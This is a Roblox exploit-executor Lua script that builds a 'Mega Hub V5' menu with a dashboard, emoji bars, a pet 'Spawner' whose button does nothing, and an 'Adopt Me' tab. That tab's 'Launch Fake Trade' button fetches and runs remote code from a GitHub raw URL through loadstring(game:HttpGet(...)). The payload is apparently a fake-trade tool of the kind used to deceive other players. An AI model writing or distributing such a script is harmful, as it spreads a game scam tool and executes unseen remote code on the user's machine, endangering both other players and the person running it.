-- [[ MEGA HUB V5: THE ULTIMATE FRESH START ]] --
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- 1. THE MAIN HUB CONTAINER
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MegaHubV5"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 520, 0, 380)
Main.Position = UDim2.new(0.5, -260, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.Active = true Main.Draggable = true
Instance.new("UICorner", Main)

-- Top Banner (Branding)
local Banner = Instance.new("Frame", Main)
Banner.Size = UDim2.new(1, 0, 0, 40)
Banner.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Instance.new("UICorner", Banner)

local Title = Instance.new("TextLabel", Banner)
Title.Size = UDim2.new(1, -20, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "Mega Hub | Jazrad Style v1.7.0"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = "GothamBold" Title.TextXAlignment = "Left" Title.BackgroundTransparency = 1

-- 2. DUAL REACTION BARS (Bottom Center)
local function CreateReactionBars()
    -- Suggest Bar
    local SBar = Instance.new("Frame", ScreenGui)
    SBar.Size = UDim2.new(0, 300, 0, 50)
    SBar.Position = UDim2.new(0.5, -150, 0.75, 0)
    SBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", SBar)
    local sL = Instance.new("UIListLayout", SBar)
    sL.FillDirection = "Horizontal" sL.HorizontalAlignment = "Center" sL.VerticalAlignment = "Center" sL.Padding = UDim.new(0, 10)
    for _, e in pairs({"👋", "🤔", "🤝", "➕", "➖", "❌"}) do
        local b = Instance.new("TextButton", SBar)
        b.Size = UDim2.new(0, 35, 0, 35) b.Text = e b.TextSize = 25 b.BackgroundTransparency = 1
    end

    -- Emoji Bar
    local EBar = Instance.new("Frame", ScreenGui)
    EBar.Size = UDim2.new(0, 340, 0, 45)
    EBar.Position = UDim2.new(0.5, -170, 0.83, 0)
    EBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", EBar)
    local eL = Instance.new("UIListLayout", EBar)
    eL.FillDirection = "Horizontal" eL.HorizontalAlignment = "Center" eL.VerticalAlignment = "Center" eL.Padding = UDim.new(0, 12)
    for _, e in pairs({"👍", "😲", "💯", "👀", "🔥", "❤️", "🎉"}) do
        local b = Instance.new("TextButton", EBar)
        b.Size = UDim2.new(0, 32, 0, 32) b.Text = e b.TextSize = 25 b.BackgroundTransparency = 1
    end
end
CreateReactionBars()

-- 3. SIDE NAVIGATION
local Side = Instance.new("Frame", Main)
Side.Size = UDim2.new(0, 150, 1, -40)
Side.Position = UDim2.new(0, 0, 0, 40)
Side.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Instance.new("UICorner", Side)

local Content = Instance.new("ScrollingFrame", Main)
Content.Size = UDim2.new(1, -170, 1, -60)
Content.Position = UDim2.new(0, 160, 0, 50)
Content.BackgroundTransparency = 1
Content.CanvasSize = UDim2.new(0,0,2,0)
Content.ScrollBarThickness = 2
local Layout = Instance.new("UIListLayout", Content)
Layout.Padding = UDim.new(0, 10)

local function Clear() for _,v in pairs(Content:GetChildren()) do if not v:IsA("UIListLayout") then v:Destroy() end end end

-- DASHBOARD TAB
local function ShowDashboard()
    Clear()
    local function Box(title, desc, color)
        local f = Instance.new("Frame", Content)
        f.Size = UDim2.new(0.95, 0, 0, 80) f.BackgroundColor3 = color
        Instance.new("UICorner", f)
        local t = Instance.new("TextLabel", f)
        t.Size = UDim2.new(1,-20,1,0) t.Position = UDim2.new(0,10,0,0)
        t.Text = "<b>"..title.."</b>\n"..desc
        t.RichText = true t.TextColor3 = Color3.new(1,1,1) t.BackgroundTransparency = 1 t.TextXAlignment = "Left"
    end
    Box("🎮 Gaming Dashboard", "Real-time stats and access controls", Color3.fromRGB(0, 150, 255))
    Box("🌍 Server Info", "Players: "..#Players:GetPlayers().."\nPlace ID: "..game.PlaceId, Color3.fromRGB(50, 180, 100))
end

-- SPAWNER TAB
local function ShowSpawner()
    Clear()
    local i = Instance.new("TextBox", Content)
    i.Size = UDim2.new(0.95, 0, 0, 45) i.PlaceholderText = "Enter Pet/Toy Name..."
    i.BackgroundColor3 = Color3.fromRGB(45, 45, 45) i.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", i)

    local fBar = Instance.new("Frame", Content)
    fBar.Size = UDim2.new(0.95, 0, 0, 45) fBar.BackgroundTransparency = 1
    Instance.new("UIListLayout", fBar).FillDirection = "Horizontal"
    local function Prop(n, c)
        local b = Instance.new("TextButton", fBar)
        b.Size = UDim2.new(0.25, -5, 1, 0) b.Text = n b.BackgroundColor3 = Color3.fromRGB(30,30,30)
        b.BorderColor3 = c b.BorderSizePixel = 2 b.TextColor3 = Color3.new(1,1,1)
    end
    Prop("F", Color3.new(0,0.6,1)) Prop("R", Color3.new(1,0,0.6)) Prop("N", Color3.new(0,1,0.4)) Prop("M", Color3.new(0.6,1,0))

    local sBtn = Instance.new("TextButton", Content)
    sBtn.Size = UDim2.new(0.95, 0, 0, 45) sBtn.Text = "Spawn High Tier"
    sBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 200) sBtn.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", sBtn)
end

-- ADOPT ME TAB
local function ShowAdoptMe()
    Clear()
    local b = Instance.new("TextButton", Content)
    b.Size = UDim2.new(0.95, 0, 0, 50) b.Text = "▶ Launch Fake Trade"
    b.BackgroundColor3 = Color3.fromRGB(0, 200, 100) b.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))()
    end)
end

-- NAV BUTTONS
local function Nav(txt, func)
    local b = Instance.new("TextButton", Side)
    b.Size = UDim2.new(1, 0, 0, 50) b.Text = txt b.TextColor3 = Color3.new(1,1,1) b.BackgroundTransparency = 1
    b.MouseButton1Click:Connect(func)
end
local sList = Instance.new("UIListLayout", Side)
Nav("📊 Dashboard", ShowDashboard)
Nav("🐾 Adopt Me", ShowAdoptMe)
Nav("🎁 Spawner", ShowSpawner)
Nav("⚙️ Misc", function() end)

ShowDashboard()
